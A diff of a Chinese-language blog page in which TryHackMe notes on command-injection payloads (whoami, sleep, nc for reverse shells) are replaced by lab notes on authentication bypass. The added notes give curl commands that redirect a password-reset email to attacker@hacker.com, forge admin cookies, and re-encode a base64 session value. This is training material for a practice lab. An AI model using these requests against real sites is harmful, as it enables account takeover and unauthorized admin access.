@@ -1,18 +1,18 @@
 <!DOCTYPE html>
 <html lang="zh-cn" dir="ltr">
     <head><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="THM上的做题记录">
-<title>命令注入基础</title>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="THM做题记录">
+<title>身份验证绕过</title>
 
-<link rel='canonical' href='https://Yerucrem.github.io/p/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/'>
+<link rel='canonical' href='https://Yerucrem.github.io/p/%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87/'>
 
-<link rel="stylesheet" href="/scss/style.min.663803bebe609202d5b39d848f2d7c2dc8b598a2d879efa079fa88893d29c49c.css"><meta property='og:title' content="命令注入基础">
-<meta property='og:description' content="THM上的做题记录">
-<meta property='og:url' content='https://Yerucrem.github.io/p/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/'>
+<link rel="stylesheet" href="/scss/style.min.663803bebe609202d5b39d848f2d7c2dc8b598a2d879efa079fa88893d29c49c.css"><meta property='og:title' content="身份验证绕过">
+<meta property='og:description' content="THM做题记录">
+<meta property='og:url' content='https://Yerucrem.github.io/p/%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87/'>
 <meta property='og:site_name' content='夜路归'>
-<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-03-18T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-03-18T00:00:00&#43;00:00'/>
-<meta name="twitter:title" content="命令注入基础">
-<meta name="twitter:description" content="THM上的做题记录">
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-03-19T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-03-19T00:00:00&#43;00:00'/>
+<meta name="twitter:title" content="身份验证绕过">
+<meta name="twitter:description" content="THM做题记录">
     <link rel="shortcut icon" href="/favicon.ico" />
 
     </head>
@@ -267,11 +267,20 @@
         <div class="widget--toc">
             <nav id="TableOfContents">
   <ol>
-    <li><a href="#分类">分类</a></li>
-    <li><a href="#有用的有效载荷">有用的有效载荷</a>
+    <li><a href="#用户名枚举">用户名枚举</a></li>
+    <li><a href="#暴力">暴力</a></li>
+    <li><a href="#逻辑缺陷">逻辑缺陷</a>
       <ol>
-        <li><a href="#linux">Linux</a></li>
-        <li><a href="#windows">windows</a></li>
+        <li><a href="#什么是逻辑缺陷">什么是逻辑缺陷？</a></li>
+        <li><a href="#逻辑缺陷示例">逻辑缺陷示例</a></li>
+        <li><a href="#逻辑缺陷实用">逻辑缺陷实用</a></li>
+      </ol>
+    </li>
+    <li><a href="#cookie-篡改">Cookie 篡改</a>
+      <ol>
+        <li><a href="#纯文本"><strong>纯文本</strong></a></li>
+        <li><a href="#hashing-散列法">Hashing <strong>散列法</strong></a></li>
+        <li><a href="#编码"><strong>编码</strong></a></li>
       </ol>
     </li>
   </ol>
@@ -301,12 +310,12 @@
 
     <div class="article-title-wrapper">
         <h2 class="article-title">
-            <a href="/p/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/">命令注入基础</a>
+            <a href="/p/%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87/">身份验证绕过</a>
         </h2>
     
         
         <h3 class="article-subtitle">
-            THM上的做题记录
+            THM做题记录
         </h3>
         
     </div>
@@ -327,7 +336,7 @@
   <path d="M3 11h16" />
   <path d="M18 16.496v1.504l1 1" />
 </svg>
-                <time class="article-time--published">2025-03-18</time>
+                <time class="article-time--published">2025-03-19</time>
             </div>
         
 
@@ -343,90 +352,195 @@
     <section class="article-content">
     
     
-    <h1 id="命令注入">命令注入
-</h1><h2 id="分类">分类
-</h2><p>命令注入主要可以通过以下两种方式之一进行检测：</p>
-<ol>
-<li>盲命令注入</li>
-<li>详细命令注入</li>
-</ol>
+    <h1 id="身份验证绕过">身份验证绕过
+</h1><h2 id="用户名枚举">用户名枚举
+</h2><h2 id="暴力">暴力
+</h2><h2 id="逻辑缺陷">逻辑缺陷
+</h2><h3 id="什么是逻辑缺陷">什么是逻辑缺陷？
+</h3><p>有时身份验证过程包含逻辑缺陷。逻辑缺陷是指应用程序的典型逻辑路径被黑客绕过、规避或纵。逻辑缺陷可以存在于网站的任何区域，但在这种情况下，我们将专注于与身份验证相关的示例。</p>
+<p><img src="/p/%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87/image-20250319103332643.png"
+	width="760"
+	height="360"
+	srcset="/p/%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87/image-20250319103332643_hu_656c10d9b933eb75.png 480w, /p/%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87/image-20250319103332643_hu_4361eaaa2d8c6db.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="211"
+		data-flex-basis="506px"
+	
+></p>
+<h3 id="逻辑缺陷示例">逻辑缺陷示例
+</h3><p>下面的模拟代码示例检查客户端正在访问的路径的开头是否以 /admin 开头，如果是，则进行进一步检查以查看客户端是否实际上是 admin。如果页面不以 /admin 开头，则会向客户端显示该页面。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">if( url.substr(0,6) === &#39;/admin&#39;) {
+</span></span><span class="line"><span class="cl">    # Code to check user is an admin
+</span></span><span class="line"><span class="cl">} else {
+</span></span><span class="line"><span class="cl">    # View Page
+</span></span><span class="line"><span class="cl">}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>因为上面的 PHP 代码示例使用了三个等号 （===），所以它正在查找字符串的完全匹配项，包括相同的字母大小写。该代码存在逻辑缺陷，因为请求 <strong>/adMin</strong> 的未经身份验证的用户将不会检查其权限，而是向他们显示页面，从而完全绕过身份验证检查。</p>
+<h3 id="逻辑缺陷实用">逻辑缺陷实用
+</h3><p>我们将检查 Acme IT 支持网站 （http：//MACHINE_IP/customers/reset） 的重置密码 功能。我们看到一个表单，要求提供与我们希望执行密码重置的账户关联的电子邮件地址。如果输入的电子邮件无效，您将收到错误消息<strong>Account not found from provided email address</strong></p>
+<p>出于演示目的，我们将使用 email address <strong><a class="link" href="mailto:robert@acmeitsupport.thm" >robert@acmeitsupport.thm</a></strong>被接受。然后，我们会看到表单的下一阶段，该阶段要求提供与此登录电子邮件地址关联的用户名。如果我们输入 robert 作为用户名并按下 Check Username 按钮，您将看到一条确认消息，告知将向 <strong><a class="link" href="mailto:robert@acmeitsupport.thm" >robert@acmeitsupport.thm</a></strong>发送一封密码重置电子邮件。</p>
+<p><img src="/p/%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87/image-20250319105628978.png"
+	width="516"
+	height="248"
+	srcset="/p/%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87/image-20250319105628978_hu_607adc598db96329.png 480w, /p/%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87/image-20250319105628978_hu_f3ac7279bb5375f9.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="208"
+		data-flex-basis="499px"
+	
+></p>
+<p>在此阶段，您可能想知道此应用程序中的漏洞可能是什么，因为您必须知道电子邮件和用户名，然后将密码链接发送到帐户所有者的电子邮件地址。</p>
+<p>在重置电子邮件过程的第二步中，用户名在 POST 字段中提交到 Web 服务器，电子邮件地址在查询字符串请求中作为 GET 字段发送。</p>
+<p>让我们通过使用 curl 工具手动向 Web 服务器发出请求来说明这一点。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">user@tryhackme$ curl &#39;http://MACHINE_IP/customers/reset?email=robert%40acmeitsupport.thm&#39; -H &#39;Content-Type: application/x-www-form-urlencoded&#39; -d &#39;username=robert&#39;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>我们使用该标志向请求添加额外的标头。在这种情况下，我们将 设置为 ，这让 Web 服务器知道我们正在发送表单数据，以便它正确理解我们的请求。</p>
+<p>在应用程序中，使用查询字符串检索用户帐户，但稍后，在应用程序逻辑中，使用 PHP 变量 <code>$_REQUEST</code> 中的数据发送密码重置电子邮件。</p>
+<p>PHP<code>$_REQUEST</code> 变量是一个数组，其中包含从查询字符串接收的数据和 POST 数据。如果查询字符串和 POST 数据使用相同的键名称，则此变量的应用程序逻辑优先使用 POST 数据字段而不是查询字符串，因此，如果我们向 POST 表单添加另一个参数，我们可以控制密码重置电子邮件的发送位置。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">user@tryhackme$ curl &#39;http://MACHINE_IP/customers/reset?email=robert%40acmeitsupport.thm&#39; -H &#39;Content-Type: application/x-www-form-urlencoded&#39; -d &#39;username=robert&amp;email=attacker@hacker.com&#39;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87/image-20250319110039108.png"
+	width="475"
+	height="259"
+	srcset="/p/%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87/image-20250319110039108_hu_13150a87f45863.png 480w, /p/%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87/image-20250319110039108_hu_821b855b9246423d.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="183"
+		data-flex-basis="440px"
+	
+></p>
+<p>**下一步，您需要在 Acme IT 支持客户部分创建一个帐户，这样做会为您提供一个可用于创建支持票证的唯一电子邮件地址。电子邮件地址的格式为 <code>{username}</code>@customer.acmeitsupport.thm</p>
+<p>现在重新运行 <strong>Curl 请求 2</strong>，但使用您的 @acmeitsupport。thm 在电子邮件字段中，您将在您的帐户上创建一个票证，其中包含一个链接，用于以 Robert 身份登录。使用 Robert 的帐户，您可以查看他们的支持票证并显示标志。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">user@tryhackme:~$ curl &#39;http://MACHINE_IP/customers/reset?email=robert@acmeitsupport.thm&#39; -H &#39;Content-Type: application/x-www-form-urlencoded&#39; -d &#39;username=robert&amp;email={username}@customer.acmeitsupport.thm&#39;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="cookie-篡改">Cookie 篡改
+</h2><p>在联机会话期间检查和编辑 Web 服务器设置的 Cookie 可能会产生多种结果，例如未经身份验证的访问、访问其他用户帐户或提升的权限。</p>
+<h3 id="纯文本"><strong>纯文本</strong>
+</h3><p>某些 cookie 的内容可以是纯文本形式，并且它们的作用很明显。例如，如果这些是成功登录后设置的 Cookie：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Set-Cookie: logged_in=true; Max-Age=3600; Path=/
+</span></span><span class="line"><span class="cl">Set-Cookie: admin=false; Max-Age=3600; Path=/
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>我们看到一个 Cookie （logged_in），它似乎用于控制用户当前是否登录，以及另一个 （admin），它控制访客是否具有管理员权限。使用这个逻辑，如果我们要更改 cookie 的内容并发出请求，我们将能够更改我们的权限。</p>
+<p>首先，我们先请求目标页面：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">user@tryhackme$ curl http://MACHINE_IP/cookie-test
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>我们可以看到我们返回了一条消息：<strong>Not Logged In</strong></p>
+<p>现在，我们将发送另一个请求，其中 logged_in Cookie 设置为 true，管理 Cookie 设置为 false：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">user@tryhackme$ curl -H &#34;Cookie: logged_in=true; admin=false&#34; http://MACHINE_IP/cookie-test
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>我们收到消息：<strong>Logged In As A User</strong></p>
+<p>最后，我们将发送最后一个请求，将 logged_in 和 admin Cookie 都设置为 true：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">user@tryhackme$ curl -H &#34;Cookie: logged_in=true; admin=true&#34; http://MACHINE_IP/cookie-test
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这将返回结果：<strong>Logged In As An Admin</strong></p>
+<h3 id="hashing-散列法">Hashing <strong>散列法</strong>
+</h3><p>有时 Cookie 值看起来像一长串随机字符;这些称为哈希，它是原始文本的不可逆表示。以下是您可能会遇到的一些示例：</p>
 <div class="table-wrapper"><table>
   <thead>
       <tr>
-          <th>方法</th>
-          <th>描述</th>
+          <th><strong>原始字符串</strong></th>
+          <th>** 哈希方法**</th>
+          <th><strong>输出</strong></th>
       </tr>
   </thead>
   <tbody>
       <tr>
-          <td>盲</td>
-          <td>这种类型的注入是在测试有效负载时应用程序没有直接输出的地方。您必须调查应用程序的行为，以确定您的有效负载是否成功。</td>
+          <td>1</td>
+          <td>md5</td>
+          <td>c4ca4238a0b923820dcc509a6f75849b</td>
       </tr>
       <tr>
-          <td>详细</td>
-          <td>这种类型的注入是测试有效负载后从应用程序获得直接反馈的地方。例如，运行 <code>whoami</code> 命令以查看应用程序在哪个用户下运行。Web 应用程序将直接在页面上输出用户名。</td>
+          <td>1</td>
+          <td>sha-256</td>
+          <td>6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b</td>
+      </tr>
+      <tr>
+          <td>1</td>
+          <td>sha-512</td>
+          <td>4dff4ea340f0a823f15d3f4f01ab62eae0e5da579ccb851f8db9dfe84c58b2b37b89903a740e1ee172da793a6e79d560e5f7f9bd058a12a280433ed6fa46510a</td>
+      </tr>
+      <tr>
+          <td>1</td>
+          <td>sha1</td>
+          <td>356a192b7913b04c54574d18c28d46e6395428ab</td>
       </tr>
   </tbody>
 </table></div>
-<h2 id="有用的有效载荷">有用的有效载荷
-</h2><h3 id="linux">Linux
-</h3><div class="table-wrapper"><table>
-  <thead>
-      <tr>
-          <th>有效载荷</th>
-          <th>描述</th>
-      </tr>
-  </thead>
-  <tbody>
-      <tr>
-          <td>whoami</td>
-          <td>查看应用程序在哪个用户下运行。</td>
-      </tr>
-      <tr>
-          <td>ls</td>
-          <td>列出当前目录的内容。您也许能够找到配置文件、环境文件（令牌和应用程序密钥）等文件，以及更多有价值的内容。</td>
-      </tr>
-      <tr>
-          <td>ping</td>
-          <td>此命令将调用应用程序以挂起。这在测试应用程序是否进行盲命令注入时非常有用。</td>
-      </tr>
-      <tr>
-          <td>sleep</td>
-          <td>这是测试应用程序盲目命令注入时的另一个有用有效负载，其中计算机未安装 <code>ping</code>。</td>
-      </tr>
-      <tr>
-          <td>nc</td>
-          <td>Netcat 可用于在易受攻击的应用程序上生成反向 shell。您可以使用此立足点在目标计算机上导航，以获取其他服务、文件或提升权限的潜在方法。</td>
-      </tr>
-  </tbody>
-</table></div>
-<h3 id="windows">windows
-</h3><div class="table-wrapper"><table>
-  <thead>
-      <tr>
-          <th>有效载荷</th>
-          <th>描述</th>
-      </tr>
-  </thead>
-  <tbody>
-      <tr>
-          <td>whoami</td>
-          <td>查看应用程序在哪个用户下运行。</td>
-      </tr>
-      <tr>
-          <td>dir</td>
-          <td>列出当前目录的内容。您也许能够找到配置文件、环境文件（令牌和应用程序密钥）等文件，以及更多有价值的内容。</td>
-      </tr>
-      <tr>
-          <td>ping</td>
-          <td>此命令将调用应用程序以挂起。这在测试应用程序是否进行盲命令注入时非常有用。</td>
-      </tr>
-      <tr>
-          <td>timeout</td>
-          <td>此命令还将调用应用程序以挂起。如果未安装 <code>ping</code> 命令，则它还可用于测试应用程序是否进行盲命令注入。</td>
-      </tr>
-  </tbody>
-</table></div>
+<p>从上表中可以看出，同一输入字符串的哈希输出可能会因使用的哈希方法而显著不同。即使哈希是不可逆的，但每次都会产生相同的输出，这对我们很有帮助，因为 <a class="link" href="https://crackstation.net/"  target="_blank" rel="noopener"
+    >https://crackstation.net/</a> 等服务会保留数十亿个哈希及其原始字符串的数据库。</p>
+<h3 id="编码"><strong>编码</strong>
+</h3><p>编码类似于哈希，因为它会创建看似随机的文本字符串，但实际上，编码是可逆的。所以这就引出了一个问题，编码的意义何在？编码使我们能够将二进制数据转换为人类可读的文本，这些文本可以通过仅支持纯文本 ASCII 字符的介质轻松安全地传输。</p>
+<p>常见的编码类型包括 base32 和 base64，前者将二进制数据转换为字符 A-Z 和 2-7，后者使用字符 a-z、A-Z、0-9、+ 和 equals 符号进行转换进行填充。</p>
+<p>以以下数据为例，该数据由 Web 服务器在登录时设置：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Set-Cookie: session=eyJpZCI6MSwiYWRtaW4iOmZhbHNlfQ==; Max-Age=3600; Path=/
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这个字符串 base64 解码的值为 <strong>{“id”：1，“admin”： false}</strong> ，然后我们可以再次将其编码回 base64 编码，但将 admin 值设置为 true，这现在为我们提供了管理员访问权限。</p>
 
 </section>
 
@@ -477,19 +591,6 @@
             
                 
 <article class="">
-    <a href="/p/%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87/">
-        
-        
-
-        <div class="article-details">
-            <h2 class="article-title">身份验证绕过</h2>
-        </div>
-    </a>
-</article>
-
-            
-                
-<article class="">
     <a href="/p/dom-%E6%96%87%E6%A1%A3%E5%AF%B9%E8%B1%A1%E6%A8%A1%E5%9E%8B/">
         
         
@@ -509,6 +610,19 @@
 
         <div class="article-details">
             <h2 class="article-title">SQL注入基础</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/%E5%85%B3%E4%BA%8Exss%E5%9F%BA%E7%A1%80%E7%9A%84%E5%88%A9%E7%94%A8/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">关于XSS基础的利用</h2>
         </div>
     </a>
 </article>
